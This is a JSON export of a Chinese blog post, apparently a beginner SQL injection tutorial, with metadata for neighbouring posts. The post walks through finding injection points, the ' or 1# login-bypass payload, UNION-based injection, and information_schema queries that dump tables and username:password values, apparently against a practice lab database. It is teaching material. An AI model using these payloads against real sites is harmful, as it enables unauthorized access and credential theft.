{"title":"SQL注入其一","uid":"50f911bc61e762a93882fb5a0615065b","slug":"SQL注入其一","date":"2023-01-14T01:50:00.000Z","updated":"2023-01-14T01:57:10.784Z","comments":true,"path":"api/articles/SQL注入其一.json","keywords":null,"cover":null,"content":"<p>1.SQL注入流程</p>\n<p>得到目标网站的一般信息和技术分析信息之后，就要寻找注入点和测试注入点，这些点位都是与数据库有交互的地方（且参数可控）一般在三个地方寻找注入点：(1)表单中的输入参数 (2)URL中的参数 (3) Cookie或header头中其它参数</p>\n<p>2.测试注入点&amp;&amp;判断闭合符号</p>\n<p>常用的测试符号 单引号’ 双引号’’ 无符号（直接拼接） 圆括号() 这些符号通常是服务器后台代码中用来包裹用户输入变量的字符，当插入正确的闭合字符时，会破坏原有的sql语句;</p>\n<p>-- +会将后接的内容视为注释，-- +注释掉了后边的语句，使sql能够正常执行</p>\n<p>3.万能密码原理</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">SELECT * FROM users WHERE username &#x3D; &#39;admin&#39; or 1#&#39; and password &#x3D; &#39;$password&#39; limit 0,1;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>去掉被注释的内容，sql语句如下：</p>\n<p># 由于admin账号存在，所以该语句恒为真，故登陆成功，这在sql注入中被称为万能密码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">SELECT * FROM users WHERE username &#x3D; &#39;admin&#39; or 1\n\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; and password &#x3D; &#39;123&#39; or 1#&#39; limit 0,1;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>4.UNION 联合查询注入</p>\n<p>联合查询是使用 union 或者 union all 拼接两条 select 语句来进行查询注入方式，效率非常高,后一条select语句的查询结果列数要与前一条相同</p>\n<p>二分法查找列数：先 order by 一个比较大的数字m，若报错再取其中位数 n 继续 order by， 若正常说明列数在 [n, m) 之间， 再取 n , m 之间的中位数 order by 如此反复多次，即可获取列数</p>\n<p>5.查询数据库内容常用语句</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1.暴库：select group_concat(schema_name) from information_schema.schemata;\n\n2.暴表1：select group_concat(table_name) from information_schema.tables where\n\ntable_schema&#x3D;&#39;security&#39;; 加引号 table_schema&#x3D;database()表示查询当前网站使用的数据库\n\n暴表2：select table_name from information_schema.tables where\n\ntable_schema&#x3D;&#39;security&#39; limit 3,1; 加引号\n\n3.暴字段1：select group_concat(column_name) from information_schema.columns where\n\ntable_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;; 加引号\n\n暴字段2：select column_name from information_schema.columns where\n\ntable_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39; limit 1,1;\n\n4.暴字段值（暴数据）：select group_concat(username,0x3a,password) from security.users; &#x2F;&#x2F;不加引号<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n","text":"1.SQL注入流程 得到目标网站的一般信息和技术分析信息之后，就要寻找注入点和测试注入点，这些点位都是与数据库有交互的地方（且参数可控）一般在三个地方寻找注入点：(1)表单中的输入参数 (2)URL中的参数 (3) Cookie或header头中其它参数 2.测试注入点&amp;...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"}],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SQL注入其二","uid":"c35bf4cdcf9610d9342e4b2e541833f0","slug":"SQL注入其二","date":"2023-01-15T07:43:08.000Z","updated":"2023-01-15T07:55:54.688Z","comments":true,"path":"api/articles/SQL注入其二.json","keywords":null,"cover":null,"text":"1. 报错注入 mysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息，在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"SSTI的理解","uid":"a02765d3f17045091b7948695d0675cc","slug":"SSTI的理解","date":"2023-01-14T01:31:42.000Z","updated":"2023-01-14T01:48:48.310Z","comments":true,"path":"api/articles/SSTI的理解.json","keywords":null,"cover":[],"text":"SSTI的理解： SSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。 SSTI引发的真正原因：render_template渲染函数的问题 render_template渲染函数是什么：就是把HTML涉及的页面与用户数据分离开，这样方便展...","link":"","photos":[],"count_time":{"symbolsCount":473,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}